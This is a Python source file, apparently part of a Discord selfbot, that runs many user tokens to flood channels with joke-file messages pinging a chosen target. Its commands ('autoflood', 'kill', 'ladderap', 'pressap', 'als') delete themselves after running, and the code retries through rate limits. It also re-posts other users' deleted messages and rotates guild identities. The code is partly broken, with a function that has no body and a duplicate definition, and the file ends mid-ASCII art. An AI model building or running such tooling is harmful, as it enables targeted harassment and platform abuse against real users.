# Function to load autoflood data from ar_ids.txt and handle errors
def load_autoflood_data():
    global auto_flood_users
    if os.path.exists("ar_ids.txt"):
        try:
            with open("ar_ids.txt", "r") as f:
                for line in f:
                    try:
                        # Parse the line (user_id, message, server_id, or channel_id)
                        user_id, message, server_or_channel = line.strip().split("||")
                        auto_flood_users[(int(user_id), server_or_channel)] = message
                    except ValueError:
                        print(f"Error parsing line: {line.strip()}")
        except Exception as e:
            print(f"Error loading autoflood data: {str(e)}")
    else:
        print("No existing autoflood data found. Starting fresh.")

# Function to save autoflood data to ar_ids.txt
def save_autoflood_data():
    try:
        with open("ar_ids.txt", "w") as f:
            for (user_id, server_or_channel), message in auto_flood_users.items():
                f.write(f"{user_id}||{message}||{server_or_channel}\n")
    except Exception as e:
        print(f"Error saving autoflood data: {str(e)}")

# Function to send flood messages as a reply
async def send_flood_reply_message(original_message, message):
    flood_response = "\n" * 1000  # Adjust this as necessary
    full_message = f"A\n{flood_response}\n{message}"
    try:
        await original_message.reply(full_message, mention_author=True)
    except Exception as e:
        print(f"Error sending flood message: {str(e)}")

# Command to start autoflood
@bot.command()
@require_password()
async def autoflood(ctx, mentioned_user: discord.User, *, message: str):
    await ctx.message.delete()
    user_id = mentioned_user.id
    if ctx.guild:  # If command is executed in a server
        server_id = ctx.guild.id
        # Store the user, message, and server ID (apply to the whole server)
        auto_flood_users[(user_id, str(server_id))] = message
        
    else:
        channel_id = ctx.channel.id  # If it's a DM or group chat
        # Store the user, message, and specific channel ID
        auto_flood_users[(user_id, str(channel_id))] = message
        

    # Save the updated autoflood data to the file
    save_autoflood_data()

# Command to stop autoflood
@bot.command()
@require_password()
async def stopautoflood(ctx, mentioned_user: discord.User):
    await ctx.message.delete()
    user_id = mentioned_user.id
    if ctx.guild:  # In server context
        server_id = ctx.guild.id
        key = (user_id, str(server_id))
    else:  # In DM/group chat context
        channel_id = ctx.channel.id
        key = (user_id, str(channel_id))

    if key in auto_flood_users:
        del auto_flood_users[key]  # Remove from active flood users
        
        # Save the updated autoflood data to remove the user
        save_autoflood_data()

        await ctx.send(f"Stopped autoflood for {mentioned_user.mention} in this context", delete_after=1)
    else:
        await ctx.send(f"{mentioned_user.mention} is not currently flooding in this context.", delete_after=1)
  
# Global variables
current_modes_200 = {}
message_count_200 = {}
jokes_200 = []  # Load jokes from jokes.txt
image_links_200 = {}  # Image links for each token
user_react_dict_200 = {}  # User IDs to ping for each token
delays_200 = {}  # Delay per token
send_messages_200 = {}  # To keep track of sending state

# Load jokes from jokes.txt
def load_jokes():
    with open('jokes.txt', 'r') as file:
        jokes = file.readlines()
    return [joke.strip() for joke in jokes]

jokes_200 = load_jokes()

def read_tokens(filename='tokens2.txt'):
    """Read tokens from a file and return them as a list."""
    with open(filename, 'r') as file:
        tokens = file.read().splitlines()
    return tokens

def get_token_by_position(position):
    """Retrieve a token by its position (1-based index)."""
    tokens = read_tokens()
    if 1 <= position <= len(tokens):
        return tokens[position - 1]
    return None


            
class MessageBot200(discord.Client):
    def __init__(self, token, channel_id, position, *args, **kwargs):
        super().__init__(*args, **kwargs)
        self.token = token
        self.channel_id = channel_id
        self.position = position

    async def on_ready(self):
        print(f'Logged in as {self.user} using token {self.token[-4:]}.')
        await self.send_messages()

    async def send_messages(self):
        global message_count_200
        channel = self.get_channel(self.channel_id) or await self.fetch_channel(self.channel_id)

        while send_messages_200.get(self.position, False):  # Check if the token is allowed to send messages
            message_count_200[self.position] = message_count_200.get(self.position, 0) + 1

            # Check if message count exceeds 7
            if message_count_200[self.position] > 7:
                message_count_200[self.position] = 0  # Reset message count

            # Select a random joke
            joke = random.choice(jokes_200)
            words = joke.split()
            ping_user = user_react_dict_200.get(self.position, None)
            image_link = image_links_200.get(self.position, None)

            await self.simulate_typing(channel)

            mode = current_modes_200.get(self.position, 1)  # Default to mode 1 if not set
            delay = delays_200.get(self.position, 0.2)  # Default delay is 0.2 if not set

            # Debugging log to show the message being sent
            print(f"Sending message with token {self.position + 1}: {joke}")

            if mode == 1:  # Normal mode: Just sends joke (with ping/image if applicable)
                msg = joke
                if ping_user:
                    msg += f" <@{ping_user}>"
                if image_link:
                    msg += f" {image_link}"
                await channel.send(msg)
                await asyncio.sleep(delay)

            elif mode == 2:  # Header mode: Adds # before the joke
                msg = f"# {joke}"
                if ping_user:
                    msg += f" <@{ping_user}>"
                if image_link:
                    msg += f" {image_link}"
                await channel.send(msg)
                await asyncio.sleep(delay)

            elif mode == 3:  # > # mode: Adds > # before the joke
                msg = f"> # {joke}"
                if ping_user:
                    msg += f" <@{ping_user}>"
                if image_link:
                    msg += f" {image_link}"
                await channel.send(msg)
                await asyncio.sleep(delay)

    async def simulate_typing(self, channel):
        """Simulate typing before sending a message."""
        async with channel.typing():
            await asyncio.sleep(random.uniform(1, 3))  # Simulate typing for a random time

@bot.command()
@require_password()
async def asma(ctx, mode: int):
    """Set the mode for all tokens."""
    if mode in [1, 2, 3]:
        for position in range(len(read_tokens())):
            current_modes_200[position] = mode
        await ctx.send(f"All tokens have been set to mode {mode}.")
    else:
        await ctx.send("Invalid mode. Please choose 1, 2, or 3.")
# Changes in the als command
@bot.command()
@require_password()
async def als(ctx, channel_id: int):
    """Start sending messages using the tokens in the specified channel."""
    global send_messages_200
    send_messages_200.clear()  # Clear previous session data
    
    tokens = read_tokens()  # Read tokens from tokens2.txt
    tasks = []  # A list to hold all tasks

    for position, token in enumerate(tokens):
        send_messages_200[position] = True  # Enable message sending for this token
        message_count_200[position] = 0  # Reset message count
        current_modes_200[position] = 1  # Default to mode 1 for each token
        delays_200[position] = 0.2  # Default delay for each token

        # Create a new MessageBot200 instance for each token and start it
        client = MessageBot200(token, channel_id, position)
        tasks.append(client.start(token, bot=False))  # Start the bot for this token

    # Wait for all tokens to start sending messages
    await asyncio.gather(*tasks)  
    await ctx.send(f"Started sending messages in channel {channel_id} with {len(tokens)} tokens.")
@bot.command()
@require_password()
async def asp(ctx, position: int, user_id: int):
    """Set ping for the specified token."""
    if 1 <= position <= len(read_tokens()):
        user_react_dict_200[position - 1] = user_id
        await ctx.send(f"Token at position {position} will now ping user <@{user_id}> at the end of messages.")
    else:
        await ctx.send(f"Invalid position. Please provide a position between 1 and {len(read_tokens())}.")

@bot.command()
@require_password()
async def aspa(ctx, user_id: int):
    """Set ping for all tokens."""
    for position in range(len(read_tokens())):
        user_react_dict_200[position] = user_id
    await ctx.send(f"All tokens will now ping user <@{user_id}> at the end of messages.")

@bot.command()
@require_password()
async def asi(ctx, position: int, image_url: str):
    """Set the image link for the specified token."""
    if 1 <= position <= len(read_tokens()):
        image_links_200[position - 1] = image_url
        await ctx.send(f"Image link set for token at position {position}.")
    else:
        await ctx.send(f"Invalid position. Please provide a position between 1 and {len(read_tokens())}.")

@bot.command()
@require_password()
async def asia(ctx, image_url: str):
    """Set the image link for all tokens."""
    for position in range(len(read_tokens())):
        image_links_200[position] = image_url
    await ctx.send("Image link set for all tokens.")

@bot.command()
@require_password()
async def asm(ctx, position: int, mode: int):
    """Set the mode for the specified token."""
    if 1 <= position <= len(read_tokens()):
        if mode in [1, 2, 3]:
            current_modes_200[position - 1] = mode
            await ctx.send(f"Mode for token at position {position} changed to {mode}.")
        else:
            await ctx.send("Invalid mode. Please choose 1, 2, or 3.")
    else:
        await ctx.send(f"Invalid position. Please provide a position between 1 and {len(read_tokens())}.")
# Commands for changing delay
@bot.command()
@require_password()
async def asd(ctx, position: int, delay: float):
    """Set the delay for a specific token."""
    if 1 <= position <= len(read_tokens()):
        delays_200[position - 1] = delay  # Set the delay for the specified token
        await ctx.send(f"Delay for token at position {position} set to {delay} seconds.")
    else:
        await ctx.send(f"Invalid position. Please provide a position between 1 and {len(read_tokens())}.")

@bot.command()
@require_password()
async def asda(ctx, delay: float):
    """Set the delay for all tokens."""
    for position in range(len(read_tokens())):
        delays_200[position] = delay  # Set the delay for all tokens
    await ctx.send(f"Delay for all tokens set to {delay} seconds.")
@bot.command()
@require_password()
async def ase(ctx):
    """Stop the sending of messages."""
    global send_messages_200
    send_messages_200.clear()  # Stop all tokens from sending messages
    await ctx.send("Message sending process has been stopped.")
    
  
  
  
  
killloop = asyncio.Event()

REQUEST_DELAY = 0.1
MAX_REQUESTS_BEFORE_SWITCH = 4

def load_file(file_path):
    """Helper function to load a file into a list."""
    with open(file_path, "r") as file:
        return [line.strip() for line in file if line.strip()]

def load_tokens():
    return load_file("tokens2.txt")  # Load tokens from tokens2.txt

def load_packs():
    return load_file("jokes.txt")

def log_action(message, channel=None):
    """Log formatted message to the console with timestamp and location type."""
    timestamp = datetime.now().strftime('%H:%M:%S')
    location = "Start"
    if channel:
        if isinstance(channel, discord.DMChannel):
            location = "DM"
        elif isinstance(channel, discord.TextChannel):
            location = "CH"
        elif isinstance(channel, discord.GroupChannel):
            location = "GC"
    
    print(f"{timestamp} - in {location}: {message}")

async def manage_outlaster(channel_id, user_id, name):
    """Main function for sending messages using tokens and handling rate limits."""
    tokens = load_tokens()
    messages = load_packs()
    if not tokens or not messages:
        log_action("Missing tokens or message packs.", bot.get_channel(channel_id))
        return

    log_action("Starting outlaster message sending...", bot.get_channel(channel_id))
    current_value = message_count = token_index = 0
    while not killloop.is_set() and tokens:
        if token_index >= len(tokens):
            token_index = 0
        
        token = tokens[token_index]
        headers = {"Authorization": f"{token}"}
        json_data = {"content": f"{random.choice(messages)} {name} <@{user_id}> \n ```{current_value}```"}
        url = f"https://discord.com/api/v9/channels/{channel_id}/messages"
        
        response = requests.post(url, headers=headers, json=json_data)
        if response.status_code == 200:
            log_action(f"Message sent with token {token_index + 1}", bot.get_channel(channel_id))
            message_count += 1
            current_value += 1
            await asyncio.sleep(REQUEST_DELAY)

            if message_count >= MAX_REQUESTS_BEFORE_SWITCH:
                message_count = 0
                token_index += 1
        elif response.status_code == 429:
            log_action("Rate limited; retrying...", bot.get_channel(channel_id))
            await asyncio.sleep(0.5)
        elif response.status_code == 403:
            log_action(f"Invalid token {token_index + 1}; removing from list.", bot.get_channel(channel_id))
            tokens.pop(token_index)
        else:
            log_action(f"Error: HTTP {response.status_code}; retrying with next token.", bot.get_channel(channel_id))
            token_index += 1

    log_action("Outlaster message sending stopped.", bot.get_channel(channel_id))

def start_outlaster_thread(channel_id, user_id,name):
    threading.Thread(target=asyncio.run, args=(manage_outlaster(channel_id, user_id,name),)).start()

name = {}

@bot.command()
@require_password()
async def kill(ctx, user: discord.User, channel_id: int, *, name: str = None):  # name is now optional
    await ctx.message.delete()  # Delete the command message
    killloop.clear()  # Clear any existing kill loops
    start_outlaster_thread(channel_id, user.id, name)  # Start the outlaster thread with the name

    # Send a confirmation message
    if name:
        await ctx.send(f"Outlaster started for {user.mention} with name '{name}'.", delete_after=5)
    else:
        await ctx.send(f"Outlaster started for {user.mention}.", delete_after=5)

@bot.command()
@require_password()
async def kille(ctx):
    await ctx.message.delete()
    killloop.set()
    await ctx.send("Outlaster stopped.", delete_after=5)



@bot.command()
@require_password()
async def ladderap(ctx, user: discord.User,name):
        with open("tokens2.txt", "r") as f:
         tokens = f.read().splitlines()
        global stop_eventText4
        stop_eventText4.clear()
        channel_id = ctx.channel.id
        user_id = user.id
        name = name
        await ctx.message.delete()
    
        spam_message_list = load_spam_messages()
        
        laddered_message_list = ['\n'.join(message.split()) for message in spam_message_list]
        
        tasks = [send_spam_messagesladdder(token, channel_id, laddered_message_list, user_id,name) for token in tokens[1:]]
        
        await asyncio.gather(*tasks)
def load_spam_messages():
    with open("jokes.txt", "r") as file:
        return [line.strip() for line in file if line.strip()]
    
name = {}   
    
async def send_spam_messagesladdder(token, channel_id, spam_message_list, user_id, name):
    headers = {
        "Authorization": token,
        "Content-Type": "application/json"
    }

    async with aiohttp.ClientSession() as session:
        url = f"https://discord.com/api/v9/channels/{channel_id}/messages"
        log_action(f"Sending messages to channel {channel_id} with token {token[:10]}...")

        while not stop_eventText4.is_set(): 
            try:
                while not stop_eventText4.is_set():
                    spam_message = random.choice(spam_message_list)
                    message_with_mention = f"{spam_message} {name} <@{user_id}>"
                    json_data = {"content": message_with_mention}

                    try:
                        async with session.post(
                            url, headers=headers, json=json_data
                        ) as response:
                            await handle_response(response)

                    except Exception as e:
                        log_action(f"An error occurred during sending: {e}")

                    await asyncio.sleep(cooldown_time)

            except Exception as e:
                log_action(f"An error occurred in the loop: {e}")
                await asyncio.sleep(1)

                
                
async def handle_response(response):
    if response.status == 200:
        log_action("Message sent successfully.")
    elif response.status == 429:
        log_action("Rate limited. Retrying after 10 seconds...")
        await asyncio.sleep(10)
    else:
        log_action(f"Failed to send message. Status: {response.status}")

@bot.command()
@require_password()
async def stopladderap(ctx):
        global stop_eventText4
        stop_eventText4.set()
        log_action(f" Executed stopladderap command to stop ladderap command", ctx.channel)
        await ctx.message.delete()
        await ctx.send("Stopped ladderap command", delete_after=5)
        
        
@bot.command()
@require_password()
async def cd(ctx, seconds: float):
        log_action(f"Executed cd command", ctx.channel)
        global cooldown_time
        await ctx.message.delete()
        cooldown_time = seconds
        await ctx.send(f"Cooldown time set to {cooldown_time} seconds.", delete_after=5)
        log_action(f"Cooldown time set to {cooldown_time} seconds", ctx.channel)


cooldown_time = 3       

stop_eventText4 = asyncio.Event()

bot.activity_texts = {}


@bot.command()
@require_password()
async def pressap(ctx, user: discord.User):
        with open("tokens2.txt", "r") as f:
         tokens = f.read().splitlines()
        log_action(f"Executed ap command", ctx.channel)
        global stop_eventText
        stop_eventText.clear()
        channel_id = ctx.channel.id
        user_id = user.id
        await ctx.message.delete()
    
        spam_message_list = load_spam_messages()
        
        tasks = [send_spam_messages(token, channel_id, spam_message_list, user_id) for token in tokens[1:]]
        
        await asyncio.gather(*tasks)

@bot.command()
@require_password()
async def pressapstop(ctx):
        global stop_eventText
        stop_eventText.set()
        log_action(f"Executed drop command to stop ap command", ctx.channel)
        await ctx.message.delete()
        await ctx.send("Stopped ap command", delete_after=5)
        
async def send_spam_messages(token, channel_id, spam_message_list, user_id):
    headers = {
        "Authorization": token,
        "Content-Type": "application/json"
    }

    async with aiohttp.ClientSession() as session:
        url = f"https://discord.com/api/v9/channels/{channel_id}/messages"
        log_action(f"Sending messages to channel {channel_id} with token {token[:10]}...")

        while not stop_eventText.is_set(): 
            try:
                while not stop_eventText.is_set():
                    spam_message = random.choice(spam_message_list)
                    message_with_mention = f"{spam_message} <@{user_id}>"
                    json_data = {"content": message_with_mention}

                    try:
                        async with session.post(
                            url, headers=headers, json=json_data
                        ) as response:
                            await handle_response(response)

                    except Exception as e:
                        log_action(f"An error occurred during sending: {e}")

                    await asyncio.sleep(cooldown_time)

            except Exception as e:
                log_action(f"An error occurred in the loop: {e}")
                await asyncio.sleep(1)


            
async def handle_response(response):
    if response.status == 200:
        log_action("Message sent successfully.")
    elif response.status == 429:
        log_action("Rate limited. Retrying after 10 seconds...")
        await asyncio.sleep(10)
    else:
        log_action(f"Failed to send message. Status: {response.status}")

async def heartbeat(ws, interval):
    try:
        while True:
            await asyncio.sleep(interval)
            await ws.send(json.dumps({"op": 1, "d": None}))
    except websockets.ConnectionClosed:
        log_action("Connection closed, stopping heartbeat.")
        return

stop_eventText = asyncio.Event()

last_deleted_message = {}

@bot.event
async def on_message_delete(message):
    if message.author != bot.user:  # Avoid storing the bot's own deleted messages
        # Store the deleted message with channel ID as the key
        last_deleted_message[message.channel.id] = {
            "author": message.author,
            "content": message.content or None,
            "attachments": message.attachments,  # Store any attachments
        }

@bot.command()
@require_password()
async def snipe(ctx):
    channel_id = ctx.channel.id

    if channel_id in last_deleted_message:
        data = last_deleted_message[channel_id]
        author = data["author"]
        content = data["content"]
        attachments = data["attachments"]

        # Construct the response message
        snipe_message = f"**{author}** deleted a message:\n"
        if content:
            snipe_message += f"> {content}\n"
        if attachments:
            snipe_message += "\nAttachments:\n"
            for attachment in attachments:
                snipe_message += f"{attachment.url}\n"

        await ctx.send(snipe_message)
    else:
        await ctx.send("No deleted messages to snipe!")
    
    
# Run the bot


# Run the bot

INTERVAL = 1  # Time between guild identity changes
GUILDS = {

    "hail": "1034280738129989704",
    "hesi": "1262925088374915204",
    "god": "1264051999595302932",
}
DISCORD_API_URL = "https://discord.com/api/v9/users/@me/clan"
guild_rotation_task = None

def change_identity(guild_name, guild_id):
    headers = {
        "Accept": "*/*",
        "Authorization": usertoken,
        "Content-Type": "application/json"
    }

    payload = {
        "identity_guild_id": guild_id,
        "identity_enabled": True
    }

    try:
        response = requests.put(DISCORD_API_URL, headers=headers, json=payload)
        if response.status_code == 200:
            print(f"Successfully changed to {guild_name}")
        else:
            print(f"Failed to change to {guild_name}. Status Code: {response.status_code}, Response: {response.text}")
    except requests.RequestException as e:
        print(f"Error while changing to {guild_name}: {e}")

async def rotate_guilds():
    while True:
        for guild_name, guild_id in GUILDS.items():
            change_identity(guild_name, guild_id)
            await asyncio.sleep(INTERVAL)

@bot.command()
@require_password()
async def rg(ctx):
    global guild_rotation_task
    if guild_rotation_task is None:
        guild_rotation_task = bot.loop.create_task(rotate_guilds())
        await ctx.send("Guild rotation started!")
    else:
        await ctx.send("Guild rotation is already running.")

@bot.command()
@require_password()
async def rge(ctx):
    global guild_rotation_task
    if guild_rotation_task is not None:
        guild_rotation_task.cancel()
        guild_rotation_task = None
        await ctx.send("Guild rotation stopped!")
    else:
        await ctx.send("Guild rotation is not running.")

@bot.command()
@require_password()
async def rgd(ctx, delay: int):
    """Change the delay for the guild rotation."""
    global INTERVAL
    if delay > 0:
        INTERVAL = delay
        await ctx.send(f"Guild rotation delay changed to {INTERVAL} seconds.")
    else:
        await ctx.send("Delay must be a positive integer.")
        
import math

ansi_color = '\u001b[31m'  # Default red color
ansi_reset = '\u001b[0m'

def format_menu_message(commands_list, page, total_pages, total_commands, start, username):
    global ansi_color, ansi_reset
    # Define the faces in a dictionary
faces = {
    "face1": (
        "⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⡀\n"
        "⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⡇\n"
        "⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣸⣧⠀\n"
        "⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀ ⣿⣦⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣴⣾⣿⣿\n"
        "⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢻⣿⣿⣶⣤⣀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⡀⣴⣿⣿⣿⣿⡿⠁⠀⠀⢰\n"
        "⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠻⣿⣿⣿⣿⣿⣦⣤⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣾⣿⣷⣿⣿⣿⣿⣿⠁⠀⠀⠀⢨⣇\n"
        "⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣰⠀⠀⠀⠀⠉⢿⣿⣿⣿⣿⣾⣿⣿⣷⣦⣄⡀⠀⠀⠀⠀⠀⠀⠀⢀⣴⣾⣿⣿⣿⣿⣿⣿⣿⣿⣇⠀⠀⠀⢀⣼⣿\n"
        "⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢿⡄⠀⠀⠀⠀⠋⠉⠉⠙⠛⠿⠟⠻⠿⠿⠿⠿⠷⣤⣀⠀⠀⢀⠴⠟⠛⠛⠛⠋⠉⠁⠉⠁⠀⠀⠀⠀⠀⠀⣼⣿⣿\n"
        "⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⣿⣶⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡀⢰⣄⣿⣿⣿⡇\n"
        "⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠹⣿⣿⣧⣀⣀⢀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢰⣶⣿⣿⣸⣿⣿⣿⡷⠀\n"
        "⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⣿⣿⣿⣿⢸⣿⣦⣦⣄⡀⠀⢠⣶⢰⣦⣶⣰⣆⣶⣰⣦⣄⢰⣴⡄⣴⠀⠀⣦⣷⣿⣿⣿⣿⣯⣿⣿⣿⠁\n"
        "⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠸⢿⣿⣿⣿⣿⣿⣿⣿⣷⠀⣼⣿⣿⣿⣿⣿⣿⣿⣿⣿⣾⣿⣿⣿⡇⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡟⠁⠀\n"
        "⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠋⣿⣿⣿⣿⣿⣿⣿⡇⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⣿⠿⠀⠀⠀\n"
        "⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣸⣿⣿⣿⣿⡿⠇⠇⠀⠀⠀⠀\n"
        "⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⢿⢹⠘⣿⣿⣿⣿⣿⣿⣿⡟⣿⣿⣿⣿⣿⣿⡟⢹⣿⣿⣿⣿⣿⣿⠹⠛⠁⠀⠀\n"
        "⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠀⠀⠈⠟⠏⢿⢿⢿⢧⠘⣿⢿⣿⡟⠿⡇⠸⣿⠿⢻⡟⠛⠈⠀⠀\n"
        "⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠀⠀⠘⠀⠀⠈⠈⠁⠀⠁⠀⠀⠀⠀⠃⠀⠀⠀⠀⠀⠀\n"
    ),
    "creepy": (
        "⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⡴⠒⠒⢤⡀⠀⠀⠀⠀⠀⠀⠀⠀⡤⠤⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀\n"
        "⠀⠀⠀⠀⠀⠀⠀⠀⠀⠇⠀⠀⠀⠀⠑⡆⠀⠀⠀⠀⠀⡠⠊⠀⠀⠀⠉⠑⠲⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀\n"
        "⠀⠀⠀⠀⠀⠀⠀⠀⠀⢇⠀⠀⠂⠀⠀⠇⠀⠀⠀⠀⠀⡇⠀⠀⠀⠠⠀⠀⠀⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀\n"
        "⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⠀⠀⠀⠀⡸⠀⠀⠀⠀⠀⠀⠣⡀⠀⠀⠀⠀⡴⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀\n"
        "⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠱⠤⠴⠋⠀⠀⠀⠀⠀⠀⠀⠀⠈⠉⠉⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀\n"
        "⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀\n"
        "⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⠤⡆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣏⠓⢤⡀⠀⠀⡤⠶⡖⠒⠲⡄⠀\n"
        "⠀⠀⠀⠀⠀⠀⠀⢀⠔⠉⠀⡜⠁⠀⠀⠀⠀⠀⠀⠀⢀⠀⠀⢀⡀⠀⠈⡆⠀⠈⠓⡾⠀⡜⠀⠀⠀⠀⠓\n"
        "⠀⡤⠖⠒⠒⢖⣇⠀⠀⢀⠏⠀⠀⣠⡞⠀⠀⢠⠎⡅⠀⢠⠋⠦⡀⠀⠣⡀⠀⢀⠏⢠⠏⠀⠀⠀⠀⠀⠀\n"
        "⠈⠀⠀⠀⠀⠀⠳⡝⠦⣎⠤⠞⠁⢰⠁⢠⠊⠀⠀⡇⠀⡅⠀⠀⠈⢧⡀⢇⣠⠃⠴⠁⠀⠀⠀⠀⠀⠀⠀\n"
        "⠀⠀⠀⠀⠀⠀⠀⠈⢧⡉⠧⡀⠀⠀⡇⠜⠀⠀⠀⠀⡇⡊⠀⠀⠀⠀⠀⡵⢣⠅⠀⠀⠀⠀⠀⠀⠀⠀⠀\n"
        "⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠦⡌⠓⠲⣿⠀⠀⠀⠀⠀⠸⠇⠀⠀⡤⠖⣫⠞⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀\n"
        "⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠂⠂⠛⠍⠭⠭⠭⠭⠝⠓⠉⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀\n"
    ),
    "bunny": (
        "⠀⣠⣶⣶⣿⣶⣦⡀⠀⠀⠀⠀⠀⠀⣠⣶⣿⣷⣶⣦⡀⠀\n"
        "⣾⡿⣫⣶⣶⣮⡻⣿⡆⠀⠀⠀⢀⣾⣿⢫⣶⣶⣯⡻⣯⡆⠀\n"
        "⢸⣿⢷⣿⣿⣿⣿⣧⢿⣿⠀⠀⠀⢸⣿⣷⣿⣿⣿⣿⣧⢻⣼⠀\n"
        "⢸⣿⢸⣿⣿⣿⣿⣿⢸⣿⠀⠀⠀⢸⣿⢻⣿⣿⣿⣿⣿⢸⣿ \n"
        "⢸⣿⢸⣿⣿⠿⣛⣥⣾⣿⣿⣿⣿⣿⣷⣶⣝⡛⢿⣿⣿⢺⢹⠀\n"
        "⠈⣿⢏⣫⣶⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣮⣅⡾⡜⠀\n"
        "⢀⣵⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣇⢇⠀\n"
        "⢠⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣂\n"
        "⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷\n"
        "⣿⡿⠟⠋⠉⠉⠛⠻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠿⠛⠉⠉⠉⠛⠿⣿\n"
        "⡏⢠⡇⠀⠀⠀⠀⠀⣨⢻⣿⣿⣿⣿⣿⣿⣿⢋⡀⠀⠀⠀⠀⠀⡆⢸\n"
        "⠁⣦⡻⢀⠀⠀⠀⡠⢊⣼⣿⣿⣿⣿⣿⣿⣿⡈⠳⠄⠀⠀⠀⠴⣣⡼\n"
        "⠈⣿⣿⣷⡶⣺⣷⣶⣿⣿⣿⣿⣛⣻⣿⣿⣿⣶⣶⣷⡲⣶⣿⠟⡝\n"
        "⠈⠫⣭⣾⣿⣿⣿⣿⣿⣿⣿⠟⣩⡙⢿⣿⣿⣿⣿⣿⣿⣿⣿⡾⡣⠊⠀\n"
        "⠀⠀⠀⠀⠙⠻⢿⣿⣿⣿⣿⡏⣿⣿⣿⣿⣿⣿⣿⣿⣿⡟⠋⠀⠀⠀⠀\n"
        "⠀⠀⠀⠀⠀⢀⣴⣾⣩⣝⣛⢣⣞⣛⣻⣛⡩⢽⣤⣀⠀⠀⠀⠀⠀\n"
    ),
    "homer": (
        "⠀⠀⠀⠀⠀⠀⠀⢀⣀⣀⣠⣤⣤⣄⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀\n"
        "⠀⠀⠀⠀⢀⣴⡟⢫⡿⢙⣳⣄⣈⡙⣦⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀\n"
        "⠀⠀⠀⠀⣾⣁⡷⣿⠛⠋⠉⠀⠈⠉⠙⠛⠦⣄⠀⠀⠀⠀⠀⠀⠀\n"
        "⠀⠀⠀⣸⣿⠉⠀⠿⠆⠀⠀⠀⠀⠀⠀⠀⠀⠈⠛⣆⠀⠀⠀⠀⠀\n"
